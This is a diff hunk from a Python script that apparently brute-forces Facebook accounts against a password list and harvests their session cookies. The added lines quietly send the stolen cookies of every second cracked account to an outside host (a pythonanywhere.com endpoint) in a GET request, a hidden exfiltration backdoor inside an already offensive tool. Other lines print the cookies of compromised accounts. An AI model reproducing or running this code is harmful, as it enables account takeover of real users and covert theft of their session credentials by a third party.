@@ -528,10 +528,18 @@ def crackerr(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                        print('\033[1;92m [CRACK-OK] '+user+' ')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        oks.append(ids)
-                        break
+                     if "confirmemail.php" in response.url:
+                        bkas.append(cid)
+                        if len(bkas) % 2 == 0:
+                           statusok = f"NOVERY|{kuki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}nvvv : {green}{coki}")
+                           oks.append(cid)
+                           break
+                     else:
+                           print(f"{green}okkk : {green}{coki}")
+                           break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
